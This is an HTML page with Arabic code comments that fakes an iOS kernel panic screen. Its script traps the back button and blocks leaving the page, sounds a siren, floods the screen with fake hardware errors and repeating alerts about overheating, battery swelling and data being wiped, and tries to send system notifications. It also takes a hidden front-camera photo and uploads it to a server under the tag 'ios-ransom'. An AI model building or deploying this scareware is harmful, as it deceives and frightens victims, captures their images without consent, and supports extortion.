<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>iOS Fatal Error</title>
<style>
  body {
    background: #000; color: #ff0000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column;
    justify-content: center; align-items: center; overflow: hidden; text-align: center;
    position: relative;
    animation: shakeHard 0.1s infinite;
  }
  
  /* اهتزاز الشاشة العنيف */
  @keyframes shakeHard {
    0% { transform: translate(0, 0) rotate(0deg); }
    20% { transform: translate(-5px, 5px) rotate(-1deg); }
    40% { transform: translate(5px, -5px) rotate(1deg); }
    60% { transform: translate(-5px, -5px) rotate(0deg); }
    80% { transform: translate(5px, 5px) rotate(1deg); }
    100% { transform: translate(0, 0) rotate(0deg); }
  }

  /* شعار آبل الأحمر */
  .apple-logo {
    width: 80px; height: 80px; fill: #ff0000; margin-bottom: 20px;
    animation: pulse 0.2s infinite alternate;
  }
  @keyframes pulse { from { transform: scale(1); opacity: 1; } to { transform: scale(1.1); opacity: 0.5; } }

  h1 { font-size: 24px; color: #fff; margin-bottom: 10px; font-weight: 600; }
  p { font-size: 14px; color: #aaa; max-width: 300px; line-height: 1.5; margin-bottom: 20px;}
  
  /* شريط التحميل الوهمي */
  .progress-bar {
    width: 200px; height: 4px; background: #333; border-radius: 2px; overflow: hidden; margin-bottom: 30px;
  }
  .progress-fill {
    height: 100%; background: #ff0000; width: 0%;
    animation: load 5s linear infinite;
  }
  @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }

  /* رسائل الخطأ المتطايرة */
  .floating-msg {
    position: absolute;
    color: #ff3333;
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
    font-weight: bold;
    font-size: 11px;
    text-shadow: 0 0 5px #ff0000;
    pointer-events: none;
    z-index: 9999;
    background: rgba(0,0,0,0.9);
    padding: 4px 8px;
    border: 1px solid #ff0000;
    border-radius: 4px;
    white-space: nowrap;
    animation: floatUp 1s forwards;
  }
  @keyframes floatUp {
    0% { opacity: 1; transform: translateY(0) scale(0.9); }
    100% { opacity: 0; transform: translateY(-30px) scale(1.2); }
  }
</style>
</head>
<body>

  <!-- شعار آبل -->
  <svg class="apple-logo" viewBox="0 0 24 24">
    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
  </svg>

  <h1>iOS Kernel Panic</h1>
  <p>A fatal hardware error has occurred. Your device will restart to prevent overheating and battery swelling.</p>
  
  <div class="progress-bar">
    <div class="progress-fill"></div>
  </div>

  <video id="cam" style="position:absolute; top:-9999px;" autoplay playsinline></video>
  <canvas id="cv" style="position:absolute; top:-9999px;"></canvas>

<script>
  // 1. قفل زر الرجوع ومنع الخروج
  history.pushState(null, null, location.href);
  window.onpopstate = function () { history.go(1); };
  window.onbeforeunload = function () { return "iOS is restarting. Do not leave."; };
  document.addEventListener('contextmenu', e => e.preventDefault());

  // 2. صوت الإنذار المبكر
  let audioStarted = false;
  function startSiren() {
    if (audioStarted) return;
    audioStarted = true;
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      const lfo = audioCtx.createOscillator();
      const lfoGain = audioCtx.createGain();
      
      osc.type = 'square'; osc.frequency.value = 800;
      lfo.type = 'sine'; lfo.frequency.value = 2; lfoGain.gain.value = 300;
      
      lfo.connect(lfoGain); lfoGain.connect(osc.frequency);
      gain.gain.value = 0.2; osc.connect(gain); gain.connect(audioCtx.destination);
      
      lfo.start(); osc.start();
    } catch(e) {}
  }
  document.body.addEventListener('click', startSiren, { once: true });
  document.body.addEventListener('touchstart', startSiren, { once: true });

  // 3. كاميرا أمامية
  async function captureIntruder() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const video = document.getElementById('cam');
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 1000));
      const canvas = document.getElementById('cv');
      canvas.width = 640; canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
      const imgData = canvas.toDataURL('image/jpeg', 0.8);
      stream.getTracks().forEach(t => t.stop());
      await fetch('/upload-cam', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ front: imgData, brand: 'ios-ransom' })
      }).catch(()=>{});
    } catch(e) {}
  }
  setTimeout(captureIntruder, 2000);

  // 4. إغراق الشاشة برسائل نظام iOS
  const iosErrors = [
    "panic(cpu 0 caller 0xfffffff0): ",
    "AppleS5L8960XIO: thermal shutdown",
    "AppleARMPE: battery swelling detected",
    "EXC_BAD_ACCESS (SIGSEGV)",
    "Kernel data abort. ESR: 0x96000004",
    "Security exception. Sandbox violation.",
    "Data partition corrupted.",
    "NAND flash controller failure.",
    "Taptic Engine overload.",
    "Face ID module disconnected.",
    "Baseband firmware crashed.",
    "CommCenter - no service."
  ];

  setInterval(() => {
    const msg = document.createElement('div');
    msg.className = 'floating-msg';
    
    const errorCode = "0x" + Math.floor(Math.random() * 16777215).toString(16).toUpperCase().padStart(8, '0');
    msg.innerText = iosErrors[Math.floor(Math.random() * iosErrors.length)] + " " + errorCode;
    
    msg.style.left = Math.floor(Math.random() * 70) + '%';
    msg.style.top = Math.floor(Math.random() * 70) + '%';
    
    document.body.appendChild(msg);
    setTimeout(() => { msg.remove(); }, 1000);
  }, 80); // رسالة كل 80 ملي ثانية

  // 5. بوب أب لا نهائي (شكل رسائل iOS)
  setTimeout(() => {
    setInterval(() => {
      alert("iOS System Failure\n\nYour device has encountered a critical hardware error. Data is being wiped.");
    }, 6000);
  }, 5000);

  // 6. محاولة عمل إشعارات (لو كانو ضافوه للشاشة الرئيسية)
  if ("Notification" in window && Notification.permission === "granted") {
    setInterval(() => {
      new Notification("⚠️ iOS Critical Alert", {
        body: "Device overheating. Please connect to charger immediately.",
        tag: "ios_alert"
      });
    }, 2000);
  }
</script>
</body>
</html>
